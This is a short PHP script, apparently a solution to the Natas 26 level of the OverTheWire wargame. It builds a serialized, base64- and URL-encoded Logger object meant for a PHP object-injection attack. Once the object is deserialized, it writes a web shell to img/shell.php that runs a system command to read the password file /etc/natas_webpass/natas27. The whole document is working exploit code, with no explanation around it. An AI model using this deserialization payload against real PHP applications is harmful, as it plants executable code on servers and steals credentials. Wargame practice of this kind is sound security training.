<?php
class Logger{
	private $logFile;
	private $initMsg;
	private $exitMsg;
  
	function __construct($file){
		// initialise variables
		$this->initMsg="#--session started--#\n";
		$this->exitMsg="#<?php system('cat /etc/natas_webpass/natas27'); ?>\n\n";
		$this->logFile = "img/shell.php";
  	
	}                       
  
	                    
}
	
print urlencode(base64_encode(serialize(new Logger("watwat"))));

?>